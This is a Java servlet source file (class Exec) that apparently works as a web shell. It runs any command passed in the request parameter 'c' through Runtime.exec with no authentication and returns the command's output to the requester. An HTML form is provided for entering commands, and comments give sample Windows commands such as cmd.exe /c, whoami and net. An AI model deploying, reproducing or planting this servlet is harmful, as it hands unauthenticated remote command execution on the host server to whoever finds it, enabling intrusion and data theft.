package com.ws;

import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Exec extends HttpServlet {

    private boolean isWin() {
        return System.getProperty("os.name").toLowerCase().indexOf("win") >= 0;
    }

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws IOException
    {
        String c = request.getParameter("c");

        if (c == null) {
            response.setContentType("text/html;charset=UTF-8");
            PrintWriter out = response.getWriter();
            out.println("<html>");
            out.println("<head>");
            out.println("<title>Execute</title>");
            out.println("</head>");
            out.println("<body>");
            out.println("<form action=\"ETest\" method=\"POST\">");
            out.println("<input name=\"c\" value=\"\"/>");
            out.println("<input type=\"submit\" name=\"submit\" value=\"Test\"/>");
            out.println("</form>");
            out.println("</body>");
            out.println("</html>");
            out.close();

        } else {
            
            String prompt;
            if (isWin()) {
                // ?c=C:\windows\system32\cmd.exe /c ...
                // ?c=C:\windows\system32\(whoami|net).exe
                prompt = "\\> " + c + "\r\n";
            } else {
                prompt = "$ " + c + "\n";
            }

            response.setContentType("text/plain;charset=UTF-8");
            OutputStream os = new BufferedOutputStream(response.getOutputStream());
            try {
                os.write(prompt.getBytes());

                Process p = Runtime.getRuntime().exec(c, null, null);
                InputStream stderr = p.getErrorStream();
                InputStream stdout = p.getInputStream();

                int read;
                byte[] bytes = new byte[10000];

                while ((read = stdout.read(bytes)) != -1) {
                    os.write(bytes, 0, read);
                }
                while ((read = stderr.read(bytes)) != -1) {
                    os.write(bytes, 0, read);
                }
            } catch (IOException e) {
                e.printStackTrace(new PrintStream(os));
            }
            os.close();
        }
    }
                

    
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        processRequest(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws IOException {
        processRequest(request, response);
    }

    public String getServletInfo() {
        return "blah ETest";
    }// </editor-fold>
}
